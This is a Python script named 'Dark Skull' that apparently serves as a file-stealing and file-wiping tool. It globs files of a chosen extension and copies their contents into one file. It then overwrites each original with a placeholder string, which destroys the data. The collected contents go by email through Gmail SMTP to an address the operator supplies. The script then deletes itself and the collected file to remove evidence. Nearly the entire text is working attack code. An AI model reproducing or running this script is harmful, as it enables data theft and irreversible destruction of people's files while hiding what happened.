# -*- coding: utf-8 -*-
#!/usr/bin/env python

import glob, smtplib, time
import os, sys, argparse
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders

def main():

        parser = argparse.ArgumentParser(description='COMMANDS:')
        parser.add_argument('--target', "-t", help="what is the target extension, for example: txt, java, js, html etc")
        parser.add_argument('--mail', "-m", help="who will receive the email")
        parser.add_argument('--directory', "-d", help="directory for the search, for example: ./, ./Downloads, ../")
        args = parser.parse_args()   

        print("Welcome to DARK SKULL")
        time.sleep(1)
        print("Created by gaidis18")
        time.sleep(0.5)
        print("")
        print("███████████████████████████")
        time.sleep(0.05)
        print("███████▀▀▀░░░░░░░▀▀▀███████")
        time.sleep(0.05)
        print("████▀░░░░░░░░░░░░░░░░░▀████")
        time.sleep(0.05)
        print("███│░░░░░░░░░░░░░░░░░░░│███")
        time.sleep(0.05)
        print("██▌│░░░░░░░░░░░░░░░░░░░│▐██")
        time.sleep(0.05)
        print("██░└┐░░░░░░░░░░░░░░░░░┌┘░██")
        time.sleep(0.05)
        print("██░░└┐░░░░░░░░░░░░░░░┌┘░░██")
        time.sleep(0.05)
        print("██░░┌┘▄▄▄▄▄░░░░░▄▄▄▄▄└┐░░██")
        time.sleep(0.05)
        print("██▌░│█▌DARK▌░░░▐SKULL█ │░▐█")
        time.sleep(0.05)
        print("███░│▐███▀▀░░▄░░▀▀███▌│░███")
        time.sleep(0.05)
        print("██▀─┘░░░░░░░▐█▌░░░░░░░└─▀██")
        time.sleep(0.05)
        print("██▄░░░▄▄▄▓░░▀█▀░░▓▄▄▄░░░▄██")
        time.sleep(0.05)
        print("████▄─┘██▌░░░░░░░▐██└─▄████")
        time.sleep(0.05)
        print("█████░░▐█─┬┬┬┬┬┬┬─█▌░░█████")
        time.sleep(0.05)
        print("████▌░░░▀┬┼┼┼┼┼┼┼┬▀░░░▐████")
        time.sleep(0.05)
        print("█████▄░░░└┴┴┴┴┴┴┴┘░░░▄█████")
        time.sleep(0.05)
        print("███████▄░░░░░░░░░░░▄███████")
        time.sleep(0.05)
        print("██████████▄▄▄▄▄▄▄██████████")
        time.sleep(0.05)
        print("███████████████████████████")
        time.sleep(0.05)
        print("")
        time.sleep(1)

        #target =input("Which extension do you want to delete?(Ex: txt, py, java, js, html, css, ru, etc):")
        target = args.target


        programs = glob.glob("{}*.{}".format(args.directory, args.target))
        for p in programs:
                file = open(p, "r")
                original = file.readlines()   
                file.close()

                file = open('content.txt', 'a')
                file.writelines(p)
                file.writelines('\n')
                file.writelines(original)
                file.writelines('\n')
                file.writelines('\n')
                file.close()

                newCode ="Nothing for here..."
                file = open(p, "w")
                file.writelines(newCode)
                file.close()

        time.sleep(1)

        print("Dark Skull infected all the {} files in this directory".format(target))
        time.sleep(1)

        print("Ready to send the content by e-mail to {}...".format(args.mail))
        time.sleep(1)

        #mail login
        fromaddr = "[<MAIL>]"
        toaddr = "{}".format(args.mail)
        frompass = "[<PASS>]"

        msg = MIMEMultipart()

        msg['From'] = fromaddr
        msg['To'] = toaddr
        msg['Subject'] = "Content from {} files".format(target)

        body = "Check all the content of {} files from your target.".format(target)
        msg.attach(MIMEText(body))

        filename = 'content.txt'
        attachment = open('content.txt', "rb")


        part = MIMEBase('text', 'plain')
        part.set_payload((attachment).read())
        encoders.encode_base64(part)
        part.add_header('Content-Disposition', "attachment; filename= %s" % filename)

        msg.attach(part)

        print("Login...")
        #smtp
        server = smtplib.SMTP('<smtp.gmail.com>', 587)
        server.ehlo()
        server.starttls()
        server.login(fromaddr,frompass)
        text = msg.as_string()

        print("Sending...")
        server.sendmail(fromaddr, toaddr, text)
        server.quit()
        time.sleep(1)

        print("Removing evidences...")
        os.remove("darkskull.py")

        endMsg = "Nothing for here..."
        file = open('content.txt', 'w')
        file.writelines(endMsg)
        file.close()

        time.sleep(1)
        print("Finished")

if __name__ == "__main__":
    main()
    os.remove("content.txt")
